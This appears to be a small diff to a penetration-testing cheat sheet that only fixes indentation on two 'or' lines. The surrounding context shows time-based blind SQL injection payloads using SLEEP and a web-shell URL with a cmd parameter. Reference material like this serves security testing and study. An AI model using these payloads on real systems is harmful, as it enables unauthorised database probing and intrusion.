@@ -224,11 +224,11 @@ http://example.com/webshell.php?cmd=id
 ' AND IF (1=1, sleep(3),'false') -- //
 ' AND IF (1=2, sleep(3), 'false') -- //
 ```
-	or
+or
 ```zsh
 ' AND 1=1; SELECT SLEEP(5); --
 ```
-	or
+or
 ```sh
 ' UNION SELECT SLEEP(5); --
 ```
